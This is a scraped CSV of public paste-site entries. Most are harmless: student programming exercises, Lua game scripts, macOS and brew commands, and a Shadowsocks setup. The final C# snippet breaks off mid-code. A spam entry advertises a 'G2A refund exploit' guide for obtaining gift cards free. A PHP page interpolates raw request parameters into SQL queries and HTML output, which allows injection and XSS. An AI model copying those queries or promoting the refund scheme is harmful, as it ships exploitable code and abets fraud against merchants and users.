id,title,username,language,date,content
LQaBKMy8,üéÅ List of all FREE Crypto Airdrops! üéÅ,VQ-Moe,GetText,Sunday 7th of January 2024 06:02:34 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://netdrop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://netdrop.netlify.app/

560769"
NcyEpJr2,data806,TestGuy1,JSON,Sunday 7th of January 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '496eb0feffebdeda16ba111fbf50418886335bdd02a4d21dd96ce5cf5742ddf3f5341e30b368b45fc790d97b6c08259b168325ab472dbb9d4f6388948b9fea9c1b96bedd4a0b7b8f01f46b5b2edfe2a12a6f29852437ab4227e0e9c5fdaf552008061072bf97c4f415ccf5048989a517e87004345665b4c64b9f1473b7f89fb0',
  otherdata: [
    '5374890beeafa20a4e80f85be6eae478',
    'ca0fcfb70304ad04e5308bab1e81038a',
    'd11f42ea1358b44b4868c80c5a4a8084',
    '3e8b581e676d79519f4d29529fec52fa',
    '45498e2b2e40ce4127b569964d521d2e',
    '5b2b83b54d80ed845e01e19e2815c35c',
    '8b29c85423bcec851fd058089823ecfb',
    'eaab75789a7a8b6f11ae517be9606c1b'
  ]
}"
u0nJfikG,–õ–†4,Maestro1,C++,Sunday 7th of January 2024 05:59:35 AM CDT,"#include <iostream>

using namespace std;


void ydalenie_min_el(int* arr, int& size) 
{
    int max_value = abs(arr[0]); 
    int max_value_ind = 0; 

    for (int i = 2; i < size; i += 2) 
    {
        if (abs(arr[i]) > max_value)
        {
            max_value = abs(arr[i]);
            max_value_ind = i;
        }
    }

    for (int i = max_value_ind; i < size - 1; ++i)
    {
        arr[i] = arr[i + 1];
    }

    --size;
}

void vivod_rezultata(int *res_arr,int size_arr)
{
    for (int i = 0; i < size_arr; ++i) 
    {
        cout << res_arr[i] << "" "";
    }
    cout << endl;
}

int main() {

    int* C = new int[5]{3, -5, 2, 8, -6};
    int* A = new int[6]{1, 7, -4, 6, 9, -2};
    int* H = new int[4]{5, -3, 8, -1};
    int* X = new int[5]{2, -7, 4, -9, 1};

    int sizeC = 5;
    int sizeA = 6;
    int sizeH = 4;
    int sizeX = 5;
    
    cout<<sizeC;

    ydalenie_min_el(C, sizeC);
    ydalenie_min_el(A, sizeA);
    ydalenie_min_el(H, sizeH);
    ydalenie_min_el(X, sizeX);

    cout << ""–ú–∞—Å—Å–∏–≤ C –ø–æ—Å–ª–µ —É–¥–∞–ª–µ–Ω–∏—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ –ø–æ –º–æ–¥—É–ª—é —ç–ª–µ–º–µ–Ω—Ç–∞ —Å —á–µ—Ç–Ω—ã–º –∏–Ω–¥–µ–∫—Å–æ–º: "";
    vivod_rezultata(C, sizeC);
    
    cout << ""–ú–∞—Å—Å–∏–≤ A –ø–æ—Å–ª–µ —É–¥–∞–ª–µ–Ω–∏—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ –ø–æ –º–æ–¥—É–ª—é —ç–ª–µ–º–µ–Ω—Ç–∞ —Å —á–µ—Ç–Ω—ã–º –∏–Ω–¥–µ–∫—Å–æ–º: "";
    vivod_rezultata(A, sizeA);
    
    cout << ""–ú–∞—Å—Å–∏–≤ H –ø–æ—Å–ª–µ —É–¥–∞–ª–µ–Ω–∏—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ –ø–æ –º–æ–¥—É–ª—é —ç–ª–µ–º–µ–Ω—Ç–∞ —Å —á–µ—Ç–Ω—ã–º –∏–Ω–¥–µ–∫—Å–æ–º: "";
    vivod_rezultata(H, sizeH);
    
    cout << ""–ú–∞—Å—Å–∏–≤ X –ø–æ—Å–ª–µ —É–¥–∞–ª–µ–Ω–∏—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ –ø–æ –º–æ–¥—É–ª—é —ç–ª–µ–º–µ–Ω—Ç–∞ —Å —á–µ—Ç–Ω—ã–º –∏–Ω–¥–µ–∫—Å–æ–º: "";
    vivod_rezultata(X, sizeX);

    delete[] C;
    delete[] A;
    delete[] H;
    delete[] X;

    return 0;
}"
Eqwyeyks,09. Fish Tank,myrdok123,Java,Sunday 7th of January 2024 05:37:41 AM CDT,"package W01FirstStepsInCoding.Exercises;

import java.util.Scanner;

public class P09FishTank {

    public static void main(String[] args) {


        Scanner scanner = new Scanner(System.in);


        int length = Integer.parseInt(scanner.nextLine());
        int width = Integer.parseInt(scanner.nextLine());
        int height = Integer.parseInt(scanner.nextLine());
        double percent = Double.parseDouble(scanner.nextLine());

        //–ü—Ä–µ—Å–º—è—Ç–∞–º–µ –æ–±–µ–º–∞ –Ω–∞ –∞–∫–≤–∞—Ä–∏—É–º–∞ –≤ –ª–∏—Ç—Ä–∏
        double fishTankVolumeInLiters = (length * width * height) * 0.001;

        //–ü—Ä–µ—Å–º—è—Ç–∞–º–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–∏—Ç–µ –ª–∏—Ç—Ä–∏ –≤–æ–¥–∞
        double neededLiters = fishTankVolumeInLiters * (1 - percent/100);

        System.out.println(neededLiters);
    }
}
"
euyfinFV,08. Basketball Equipment,myrdok123,Java,Sunday 7th of January 2024 05:37:09 AM CDT,"package W01FirstStepsInCoding.Exercises;

import java.util.Scanner;

public class P08BasketballEquipment {

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);


        int feePerYear = Integer.parseInt(scanner.nextLine());

        //–ü—Ä–µ—Å–º—è—Ç–∞–º–µ —Ü–µ–Ω–∞—Ç–∞ –∑–∞ –∫–µ—Ü–æ–≤–µ, –µ–∫–∏–ø, —Ç–æ–ø–∫–∞, –∞–∫—Å–µ—Å–æ–∞—Ä–∏

        double trainersPrice = feePerYear - feePerYear * 0.40; // feePerYear * 0.60
        double suitPrice = trainersPrice - trainersPrice * 0.20; //trainersPrice * 0.80
        double ballPrice = suitPrice / 4;
        double accessoriesPrice = ballPrice / 5;

        // –ü—Ä–µ—Å–º—è—Ç–∞–º–µ –æ–±—â–∞—Ç–∞ —Å—É–º–∞ –∑–∞ —Ä–∞–∑—Ö–æ–¥–∏
        // => –≥–æ–¥. —Ç–∞–∫—Å–∞ + —Ü–µ–Ω–∞ –∑–∞ –∫–µ—Ü–æ–≤–µ + —Ü–µ–Ω–∞ –∑–∞ –µ–∫–∏–ø + —Ü–µ–Ω–∞ –∑–∞ —Ç–æ–ø–∫–∞ + —Ü–µ–Ω–∞ –∑–∞ –∞–∫—Å–µ—Å–æ–∞—Ä–∏

        double finalPrice = feePerYear + trainersPrice + suitPrice + ballPrice + accessoriesPrice;

        System.out.println(finalPrice);






    }
}
"
XttQE2PN,06. Repainting,myrdok123,Java,Sunday 7th of January 2024 05:36:39 AM CDT,"package W01FirstStepsInCoding.Exercises;

import java.util.Scanner;

public class P06Repainting {

    public static void main(String[] args) {


        Scanner scanner = new Scanner(System.in);

        //–ü—Ä–æ—á–∏—Ç–∞–º–µ –≤—Ö–æ–¥–Ω–∏—Ç–µ –¥–∞–Ω–Ω–∏
        int neededNylon = Integer.parseInt(scanner.nextLine());
        int neededPaint = Integer.parseInt(scanner.nextLine());
        int neededThinner = Integer.parseInt(scanner.nextLine());
        int neededHours = Integer.parseInt(scanner.nextLine());

        //–ü—Ä–µ—Å–º—è—Ç–∞–º–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Ço –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –Ω–∞–π–ª–æ–Ω, –±–æ—è –∏ —Ä–∞–∑—Ä–µ–¥–∏—Ç–µ–ª,
        // –∫–∞—Ç–æ –¥–æ–±–∞–≤—è–º–µ 10% –∑–∞ –±–æ—è –∏ —Ä–∞–∑—Ä–µ–¥–∏—Ç–µ–ª –∏ 2–∫–≤.–º. –Ω–∞–π–ª–æ–Ω

        double nylonPrice = (neededNylon + 2) * 1.50;
        double paintPrice = (neededPaint + neededPaint * 0.10) * 14.50;
        double thinnerPrice = neededThinner * 5.00;

        //–ü—Ä–µ—Å–º—è—Ç–∞–º –æ–±—â–∞—Ç–∞ —Å—É–º–∞ –∑–∞ –º–∞—Ç–µ—Ä–∏–∞–ª–∏—Ç–µ
        double totalSumForMaterials = nylonPrice + paintPrice + thinnerPrice + 0.40;

        //–ü—Ä–µ—Å–º—è—Ç–∞–º–µ —Å—É–º–∞—Ç–∞ –∑–∞ —Ç—Ä—É–¥–∞
        double buildersPrice = (totalSumForMaterials * 0.30) * neededHours;

        //–ü—Ä–µ—Å–º—è—Ç–∞–º–µ –æ–±—â–∞—Ç–∞ —Å—É–º–∞ => —Å—É–º–∞—Ç–∞ –∑–∞ –º–∞—Ç–µ—Ä–∏–∞–ª–∏ + —Å—É–º–∞—Ç–∞ –∑–∞ —Ç—Ä—É–¥ –Ω–∞ –º–∞–π—Å—Ç–æ—Ä–∏—Ç–µ
        double totalSum = totalSumForMaterials + buildersPrice;

        System.out.println(totalSum);



    }
}
"
PGxWmc9h,05. Supplies for School,myrdok123,Java,Sunday 7th of January 2024 05:35:57 AM CDT,"package W01FirstStepsInCoding.Exercises;

import java.util.Scanner;

public class P05SuppliesForSchool {


    public static void main(String[] args) {


        Scanner scanner = new Scanner(System.in);


        //–ü—Ä–æ—á–∏—Ç–∞–º–µ –≤—Ö–æ–¥–Ω–∏—Ç–µ –¥–∞–Ω–Ω–∏
        int countPenPackage = Integer.parseInt(scanner.nextLine());
        int countHighlightersPackage = Integer.parseInt(scanner.nextLine());
        int cleaningAgent = Integer.parseInt(scanner.nextLine());
        int discount = Integer.parseInt(scanner.nextLine());


        //–ü—Ä–µ—Å–º—è—Ç–∞–º–µ —Ü–µ–Ω–∞—Ç–∞ –∑–∞ —Ö–∏–º–∏–∫–∞–ª–∏, –º–∞—Ä–∫–µ—Ä–∏ –∏ –ø—Ä–µ–ø–∞—Ä–∞—Ç
        double penPrice = countPenPackage * 5.80;
        double highlightersPrice = countHighlightersPackage * 7.20;
        double cleaningAgentPrice = cleaningAgent * 1.20;

        double sumWithoutDiscount = penPrice + highlightersPrice + cleaningAgentPrice;

        double finalSum = sumWithoutDiscount - (sumWithoutDiscount * discount / 100);

        System.out.println(finalSum);
    }
}
"
XyL45CqL,03. Deposit Calculator,myrdok123,Java,Sunday 7th of January 2024 05:35:23 AM CDT,"package W01FirstStepsInCoding.Exercises;

import java.util.Scanner;

public class P03DepositCalculator {

    public static void main(String[] args) {

        Scanner scanner = new Scanner(System.in);


        //–ü—Ä–æ—á–∏—Ç–∞–º–µ –≤—Ö–æ–¥–Ω–∏—Ç–µ –¥–∞–Ω–Ω–∏
        double depositSum = Double.parseDouble(scanner.nextLine());
        int months = Integer.parseInt(scanner.nextLine());
        double interestRate = Double.parseDouble(scanner.nextLine());

        //–ü—Ä–µ—Å–º—è—Ç–∞–º–µ –ø–µ—á–∞–ª–±–∞—Ç–∞ –∑–∞ –º–µ—Å–µ—Ü
        double profitPerMonth = (depositSum * ( interestRate / 100 )) / 12;

        //–ü—Ä–µ—Å–º—è—Ç–∞–º–µ –æ–±—â–∞—Ç–∞ —Å—É–º–∞
        double totalSum = depositSum + profitPerMonth * months;

        System.out.println(totalSum);




    }
}
"
f3tv3uUv,02. Radians to Degrees,myrdok123,Java,Sunday 7th of January 2024 05:34:44 AM CDT,"package W01FirstStepsInCoding.Exercises;

import java.util.Scanner;

public class P02RadiansToDegrees {

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);


        double radians = Double.parseDouble(scanner.nextLine());

        double degrees = radians * 180 / Math.PI;

        System.out.println(degrees);
    }
}
"
7sZwwQFX,01. USD to BGN,myrdok123,Java,Sunday 7th of January 2024 05:32:04 AM CDT,"package W01FirstStepsInCoding.Exercises;

import java.util.Scanner;

public class P01USDToBGN {

    public static void main(String[] args) {

        Scanner scanner = new Scanner(System.in);

        double usd = Double.parseDouble(scanner.nextLine());

        //double bgn = usd * 1.79549;

        System.out.println(usd * 1.79549);


    }
}
"
4yfLuPqE,Untitled,hoz65105,HTML,Sunday 7th of January 2024 05:29:08 AM CDT,https://pastebin.com/Wh8PgPV4
z1w6kaKB,ü§ë G2A.com Refund Exploit Jan 2024 ü§ë,G2ARefundExploit,GetText,Sunday 7th of January 2024 05:25:49 AM CDT,"G2A.com refund exploit updated guide 
Any item for free on G2A.com such as Amazon, Steam, and any other gift cards.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_880783.pdf
 
Working as of
07 January 2024"
pd2MeZnG,testing,Larvix,Lua,Sunday 7th of January 2024 05:13:02 AM CDT,"version = ""Hivemind v0.0""
devBuild = false


local system = {}
system.data = {} 
    
system.getBasic = function()

	system.data.version = version

 -- Check if advanced/basic
	if term.isColour() then system.data.grade = ""Advanced""
	else system.data.grade = ""Basic"" end

 -- Check device type
	if peripheral.getType(""back"") == ""neuralInterface"" then system.data.type = ""Neural""
	elseif turtle then system.data.type = ""Turtle""
	else system.data.type = ""Computer"" end

end

     -- Check for GPS
system.getPos = function()

	system.data.pos = {}
	system.data.pos[""x""],system.data.pos[""y""],system.data.pos[""z""] = gps.locate()
	if not system.data.pos[""x""] then system.data.pos = ""Lost"" end

end

-- Check peripherals (+modules)
system.getPeriph = function()

	system.data.peripherals = {}
	side = peripheral.getNames()
	for i = 1,#side do
		system.data.peripherals[side[i]] = peripheral.getType(side[i])
	end

	if peripheral.wrap(""back"") == ""neuralInterface"" then
        if peripheral.wrap(""back"").listModules() then
            system.data.modules = peripheral.wrap(""back"").listModules()
        end
    end

end

 -- Check where turtle/mob is facing
system.getBearing = function()

	if turtle then
        if turtle.getFuelLevel() > 1 and system.data.pos[""x""] then
            turns = 0
            for attempt = 1,4 do
                if not system.data.pos[""bearing""] and turtle.forward() then
                    local tmpX,tmpY,tmpZ = gps.locate()
                    if tmpX then
                        tmpX = tmpX - system.data.pos[""x""]
                        tmpZ = tmpZ - system.data.pos[""z""]
                        if tmpX ~= 0 then
                            if tmpX > 0 then
                                system.data.pos[""bearing""] = ""east""
                            else
                                system.data.pos[""bearing""] = ""west""
                            end
                        elseif tmpZ ~= 0 then
                            if tmpZ > 0 then
                                system.data.pos[""bearing""] = ""south""
                            else
                                system.data.pos[""bearing""] = ""north""
                            end
                        end
                    end
                    if not turtle.back() then
                        system.data.pos[""x""],system.data.pos[""y""],system.data.pos[""z""] = gps.locate()
                        if not system.data.pos[""x""] then system.data.pos = ""Lost"" end
                    end
                end
                if not system.data.pos[""bearing""] then
                    turtle.turnLeft()
                    turns = turns + 1
                else
                    if turns == 3 then
                        turtle.turnLeft()
                    else
                        for t = 1,turns do
                            turtle.turnRight()
                        end
                    end
                    break
                end
            end
        end

	elseif peripheral.wrap(""back"") == ""neuralInterface"" then
        if peripheral.wrap(""back"").hasModule(""plethora:sensor"") and peripheral.wrap(""back"").hasModule(""plethora:introspection"") then
            system.data.pos[""yaw""] = peripheral.wrap(""back"").getMetaOwner().yaw
        end
	end

end

-- Check turtle fuel level
system.getFuel = function()

	if turtle then
        system.data.fuel = turtle.getFuelLevel()
	end

end

-- Check turtle-inventory/interface-equipment
system.getInv = function()

	if turtle then
		system.data.inventory = {}
        for i = 1,16 do
            if turtle.getItemDetail(i) then
                system.data.inventory[i] = {turtle.getItemDetail(i).count, turtle.getItemDetail(i).name}
            end
        end

    elseif peripheral.wrap(""back"") == ""neuralInterface"" then
        if peripheral.wrap(""back"").hasModule(""plethora:introspection"") then
            system.data.inventory = {}
            for itemSlot,itemData in pairs(peripheral.wrap(""back"").getEquipment().list()) do
                system.data.inventory[itemSlot] = itemData.name
            end
        end
    end

end

system.setup = function()
	system.getBasic()
	system.getPos()
	system.getPeriph()
	system.getBearing()
	system.getFuel()
	system.getInv()
	--if not fs.exists(""./system.txt"") then
        file = fs.open(""./system.txt"",""w"")
        file.write(textutils.serialise(system.data))
        file.close()
    --else
		--oldData = fs.open(""./system.txt"",""r"").readAll()
	--end
end

return {system = system}"
2N6Cjfwu,Lekcja 16,Akaitori,C#,Sunday 7th of January 2024 05:11:26 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;


namespace BrickGame
{
    internal class Program
    {
        static string[] plansza;
        static int punkty = 0;
        const string GRACZ = ""^"";
        const string PRZESZKODA = ""#"";
        static void Main(string[] args)
        {
            string jeszczeRaz;
            do
            {
                int pozycjaGracza = 1;
                Random generatorLosowy = new Random();
                bool czyUderzony = false;
                int speed = 0;
                int czasNitro = -1;
                NowaPlansza(10);
                UstawGracza(pozycjaGracza);
                PokazPlansze();

                while (!czyUderzony)
                {
                    //sterowanie
                    if (Console.KeyAvailable)
                    {
                        ConsoleKeyInfo nacisnietyKlawisz = Console.ReadKey(true);
                        if (nacisnietyKlawisz.Key == ConsoleKey.RightArrow)
                        {
                            if (pozycjaGracza < 2)
                            {
                                pozycjaGracza++;
                            }
                        }
                        if (nacisnietyKlawisz.Key == ConsoleKey.LeftArrow)
                        {
                            if (pozycjaGracza > 0)
                            {
                                pozycjaGracza--;
                            }
                        }
                        if (nacisnietyKlawisz.Key == ConsoleKey.Spacebar)
                        {
                            if (czasNitro == -1)
                            {
                                czasNitro = 10;
                            }
                        }
                        while (Console.KeyAvailable)
                        {
                            Console.ReadKey(false);
                        }
                    }

                    if (czasNitro == 10)
                    {
                        speed += 200;
                        czasNitro--;
                    }
                    else if (czasNitro > 0)
                    {
                        czasNitro--;
                    }
                    else if (czasNitro == 0)
                    {
                        speed -= 200;
                        czasNitro = -1;
                    }

                    //sprawdzenie uderzenia 
                    int pozycjaNajblizszejPrzeszkody = plansza[plansza.Length - 2].IndexOf(PRZESZKODA);
                    if (pozycjaGracza == pozycjaNajblizszejPrzeszkody)
                    {
                        czyUderzony = true;
                    }
                    else
                    {
                        punkty++;
                    }

                    //nowa przeszkoda
                    int pozycjaPrzeszkody = generatorLosowy.Next(3);
                    string przeszkoda = UstawPrzeszkode(pozycjaPrzeszkody);
                    //przesuniƒôcie planszy w d√≥≈Ç
                    for (int i = plansza.Length - 2; i > 0; i--)
                    {
                        plansza[i] = plansza[i - 1];
                    }
                    plansza[0] = przeszkoda;
                    UstawGracza(pozycjaGracza);
                    PokazPlansze();
                    speed++;
                    if (speed > 600)
                    {
                        Thread.Sleep(1);
                    }
                    else
                    {
                        Thread.Sleep(600 - speed);
                    }
                }
                Console.Clear();
                Console.WriteLine(""GAME OVER!"");
                Console.WriteLine($""Zdoby≈Çe≈õ {punkty} punkt√≥w"");
                Console.WriteLine(""Chcesz zagraƒá ponownie?"");
                jeszczeRaz = Console.ReadLine();
                if (jeszczeRaz == ""nie"")
                {
                    Environment.Exit(0);
                }
                punkty = 0;
            } while (jeszczeRaz == ""tak"" || jeszczeRaz == ""Tak"");
            Console.ReadLine();
            
        }
        private static void NowaPlansza(int rozmiarPlanszy)
        {
            plansza = new string[rozmiarPlanszy];
            for (int i = 0; i < plansza.Length; i++)
            {
                plansza[i] = """";
            }
        }
        private static void UstawGracza(int pozycja)
        {
            string linia = ""   ""; //w cudzys≈Çowie 3 spacje
            linia = linia.Insert(pozycja, GRACZ);
            plansza[plansza.Length - 1] = linia;
        }
        private static string UstawPrzeszkode(int pozycja)
        {
            string linia = ""   ""; //w cudzys≈Çowie 3 spacje
            linia = linia.Insert(pozycja, PRZESZKODA);
            return linia;
        }
        private static void PokazPlansze()
        {
            Console.Clear();
            for (int i = 0; i < plansza.Length; i++)
            {
                Console.WriteLine(plansza[i]);
            }
            Console.WriteLine($""Punkty: {punkty}"");
        }
    }
}
"
BefMDNu9,cant update tabel status,prasetyowibowo1984,PHP,Sunday 7th of January 2024 04:46:34 AM CDT,"<?php include('config.php'); ?>
<!DOCTYPE html>
<html>
  <head>
    <!-- Required meta tags -->
    <meta charset=""utf-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1, shrink-to-fit=no"">
    <link href=""css/swap.css"" rel=""stylesheet"">

    <link rel=""stylesheet"" href=""fonts/icomoon/style.css"">


    <!-- Bootstrap CSS -->
    <link rel=""stylesheet"" href=""css/bootstrap.min.css"">
    
    <!-- Style -->
    <link rel=""stylesheet"" href=""css/style.css"">

    <title>Line7 FINAL</title>
  </head>
<body>
    <nav>
	<div class=""width"">
    		<ul>
         	    <li class=""""><a href=""index.php"" style=""text-decoration: none"">Home</a></li>
        	</ul>
	</div>
    </nav>
		
		<?php
		//jika sudah mendapatkan parameter GET id dari URL
		if(isset($_GET['id'])){
			//membuat variabel $id untuk menyimpan id dari GET id di URL
			$id = $_GET['id'];
			
			//query ke database SELECT tabel tb_request berdasarkan id = $id
			$select = mysqli_query($koneksi, ""SELECT * FROM tb_request WHERE id='$id'"") or die(mysqli_error($koneksi));
			
			//jika hasil query = 0 maka muncul pesan error
			if(mysqli_num_rows($select) == 0){
				echo '<div class=""alert alert-warning"">ID tidak ada dalam database.</div>';
				exit();
			//jika hasil query > 0
			}else{
				//membuat variabel $data dan menyimpan data row dari query
				$data = mysqli_fetch_assoc($select);
			}
		}
		?>
		
		<?php
		//jika tombol simpan di tekan/klik
		if(isset($_POST['submit'])){
			//$dispatcher	= $_POST['dispatcher'];
			$dispatcher		= $_POST['dispatcher'];

			$sql = mysqli_query($koneksi, ""UPDATE tb_request SET status='Not Active' WHERE dispatcher='$dispatcher'"") or die(mysqli_error($koneksi));
			$sql = mysqli_query($koneksi, ""UPDATE tb_request SET dispatcher='$dispatcher', selesai=NOW() WHERE id='$id'"") or die(mysqli_error($koneksi));

			if($sql){
				echo '<script> document.location=""index_show.php?id='.$id.'"";</script>';
			}else{
				echo '<div class=""alert alert-warning"">Gagal melakukan proses edit data.</div>';
			}
		}
		?>
		
		<div class=""col-md-6"">
		<div class=""box"">
		<h3 class=""heading""><font color=""black"">Update Request</font></h3>
		<form class=""mb-5"" action=""edit.php?id=<?php echo $id; ?>"" method=""post"">
		<table id=""tabel-data"" class=""table table-striped table-hover table-sm table-bordered"">
		<tbody>
		
			<div class=""form-group row"">
				<label class=""col-sm-2 col-form-label"">Line</label>
				<div class=""col-sm-5"">
					<input disabled type=""text"" name=""line"" class=""form-control"" value=""<?php echo $data['line']; ?>"" required>
				</div>
			</div>
			
			<div class=""form-group row"">
				<label class=""col-sm-2 col-form-label"">ModelName</label>
				<div class=""col-sm-5"">
					<input disabled type=""text"" name=""modelname"" class=""form-control"" value=""<?php echo $data['modelname']; ?>"" required>
				</div>
			</div>

			<div class=""form-group row"">
				<label class=""col-sm-2 col-form-label"">Dispatcher</label>
				<div class=""col-sm-5"">
					<input type=""text"" name=""dispatcher"" class=""form-control"" value="""" placeholder=""DISPATCHER"" maxlength=""10"" onkeypress=""return tabE(this,event)"" autofocus=‚Äùautofocus‚Äù required>
				</div>
			</div>
						
			<div class=""form-group row"">
				<label class=""col-sm-2 col-form-label"">&nbsp;</label>
				<div class=""col-sm-5"">
					<input type=""submit"" name=""submit"" class=""btn btn-block btn-primary rounded-0 py-2 px-4"" value=""U P D A T E"">
				</div>
			</div>
		</form>

	
    <script src=""js/jquery-3.3.1.min.js""></script>
    <script src=""js/popper.min.js""></script>
    <script src=""js/bootstrap.min.js""></script>
    <script src=""js/jquery.validate.min.js""></script>
    <script src=""js/main.js""></script>
	
</body>
</html>"
6rL6HEKj,Task15,Savenok,C,Sunday 7th of January 2024 04:42:14 AM CDT,"#include <stdio.h>
#include <stdlib.h>

void allocateMemory(int **array, int m, int n)
{
    for (int i = 0; i < n; i++)
	{
		for (int j = 0; j < m; j++)
		{
			array[i] = (int*)malloc(m * sizeof(int));
		}
	}
}

void fillArray(int** array, int m, int n)
{
	printf(""Input array elements:\n"");
	for (int i = 0; i < n; i++)
	{
		for (int j = 0; j < m; j++)
		{
			printf(""Input %d row %d col: "", i + 1, j + 1);
			scanf(""%d"", &array[i][j]);
		}
	}
}

void printArray(int** array, int m, int n)
{
	printf(""Array elements:\n"");
	for (int i = 0; i < n; i++)
	{
		for (int j = 0; j < m; j++)
		{
			printf(""%d "", array[i][j]);
		}
		printf(""\n""); 
	}
}

int findIndex(int** array, int m, int n)
{
	int sum = 0, temp = 0, maxIndex = 0;
	int i, j;
	for (j = 0; j < n; j++)
	{
		for (i = 0; i < n; i++)
		{
			sum += array[i][j];
		}
		if ((sum > temp) || (j == 0))
		{
			maxIndex = j;
			temp = sum;
		}
	}
	return maxIndex + 1;
}

void freeMemory(int** array, int m, int n) {
    for (int i = 0; i < n; i++) {
        free(array[i]);
    }
	free(array);
}

int main()
{
	int m = 0;
	int n = 0;
	int maxIndex = 0;
	printf(""Input m:\n"");
	scanf(""%d"", &m);
	printf(""Input n:\n"");
	scanf(""%d"", &n);
	int **array = (int**)malloc(m * sizeof(int));
	allocateMemory(array, m, n);
	fillArray(array, m, n);
	printArray(array, m, n);
	maxIndex = findIndex(array, m, n);
	printf(""Max index: %d"", maxIndex);
	freeMemory(array, m, n);
	return 0;
}"
1j8a53uK,Shadowsocks Ubuntu 22.04,paperline27,Bash,Sunday 7th of January 2024 04:41:20 AM CDT,"@powered by adearie

$sudo su
#apt update -y ; apt upgrade -y ; apt install shadowsocks-libev
#nano /etc/shadowsocks-libev/config.json
>127.0.0.1¬†ganti¬†0.0.0.0
>mode ganti tcp
>server_port¬†ganti 8338
>password ganti akubahagia
>timeout ganti 60
>yang lain-lain mau dirubah atau ditambah silahkan kalo paham
#systemctl restart shadowsocks-libev.service
#systemctl enable shadowsocks-libev.service
#systemctl status shadowsocks-libev.service
#iptables -I INPUT -p tcp --dport 8338 -j ACCEPT
#ufw allow 8338"
UakLQ2Sp,Install Apps via Brew,inhaletech,Bash,Sunday 7th of January 2024 03:43:07 AM CDT,"#You need to install https://brew.sh before using these commands
brew install google-chrome
brew install app-cleaner
brew install cheatsheet
brew install vlc
brew install xnconvert
brew install the-unarchiver

brew install discord
brew install telegram
brew install viber
brew install slack
brew install whatsapp

brew install zoom

brew install --cask sublime-text
brew install --cask iterm2
brew install --cask disk-inventory-x
brew install --cask rectangle
brew install --cask transmission"
HwQPErJE,Untitled,sissou123,PHP,Sunday 7th of January 2024 03:40:41 AM CDT,"Build Complete 2019 CMS Blog in PHP MySql PDO & Bootstrap 4
Create Stunning Content Management System (CMS) with Admin Panel in PHP PDO MySQL & Bootstrap 4 from Scratch 
This course is updated to newer version of Bootstrap 4.2.1 on 27/01/209 and using PDO layer for Database Operations.

This Course will teach student how to create powerful Content Management System (CMS) with Admin Panel in PHP. 
for more:https://cuty.io/jqj7UPylh
"
GHYiztkY,macOS Adjustments,inhaletech,Bash,Sunday 7th of January 2024 03:37:33 AM CDT,"#Show full path in Finder title
defaults write com.apple.finder _FXShowPosixPathInTitle -bool true

#Increase speed of Dock animation
defaults write com.apple.dock autohide-delay -float ""0.0""
defaults write com.apple.dock autohide-time-modifier -float ""0.0001"" 

#Use ""List"" as default view for folders
defaults write com.apple.finder ""FXPreferredViewStyle"" -string ""Nlsv""

#Don't ask to use external harddrive as TimeMachine backup
defaults write com.apple.TimeMachine ""DoNotOfferNewDisksForBackup"" -bool ""true""

#Disable creating .DS_Store files
defaults write com.apple.desktopservices DSDontWriteNetworkStores TRUE

#Increase speed of Finder animations
defaults write -g QLPanelAnimationDuration -float 0
defaults write com.apple.finder DisableAllAnimations -bool true

#Put all screenshots to ~/Desktop/screenshots
defaults write com.apple.screencapture location -string ~/Desktop/screenshots

#Disable icons on Desktop
defaults write com.apple.finder CreateDesktop false

#Restart Finder
killall Finder

#Restart UI Server
killall SystemUIServer"
7uBDtUrg,QuickLook Extensions,inhaletech,Bash,Sunday 7th of January 2024 03:27:44 AM CDT,"#You need to install https://brew.sh before using these commands
brew install qlmarkdown
brew install quicklook-json
brew install qlvideo
brew install suspicious-package
brew install qlcolorcode
brew install quicklook-csv"
bFHPEY4J,Reactor Button On/Off (Rafa),MigasRocha,Lua,Sunday 7th of January 2024 03:23:14 AM CDT,"while true do

m = peripheral.wrap(""front"")

term.redirect(m)

m.clear()
m.setTextColor(colors.purple)
m.setCursorPos(1,1)
m.write(""Reator"")
m.setTextColor(colors.green)
m.setCursorPos(1,3)
m.write(""On"")
m.setTextColor(colors.red)
m.setCursorPos(1,5)
m.write(""Off"")


local event, side, x, y = os.pullEvent(""monitor_touch"")

if x == 1 and y == 3 then

m.clear()
m.setTextColor(colors.purple)
m.setCursorPos(1,1)
m.write(""Reator"")
m.setTextColor(colors.green)
m.setCursorPos(1,3)
m.write(""On"")
m.setTextColor(colors.red)
m.setCursorPos(1,5)
m.write(""Off"")
    m.setCursorPos(5,3)
    m.setTextColor(colors.yellow)
    m.write(""X"")
    sleep(10)
  end
     
if x == 1 and y == 5 then
    
m.clear()
m.setTextColor(colors.purple)
m.setCursorPos(1,1)
m.write(""Reator"")
m.setTextColor(colors.green)
m.setCursorPos(1,3)
m.write(""On"")
m.setTextColor(colors.red)
m.setCursorPos(1,5)
m.write(""Off"")
    m.setCursorPos(5,5)
    m.setTextColor(colors.yellow)
    m.write(""X"")
    sleep(10)
end
end"
uYEZPcVf,Untitled,glados123123123123,C#,Sunday 7th of January 2024 03:13:59 AM CDT,"///RECON STATION CODE
using System;
using System.Collections.Generic;
using System.Text;
using TombsMadnessMod.ItemScript;
using UnityEngine;
 
namespace TombsMadnessMod.Unlockables
{
    public class ReconStation : MonoBehaviour
    {
        public static readonly List<RangedMicrophone> rangedMicrophones = new List<RangedMicrophone>();
        public int tuneIndex;
        private bool enabled;

        public void PowerButtonPress()
        {
            enabled = !enabled;
            if (!enabled)
            {
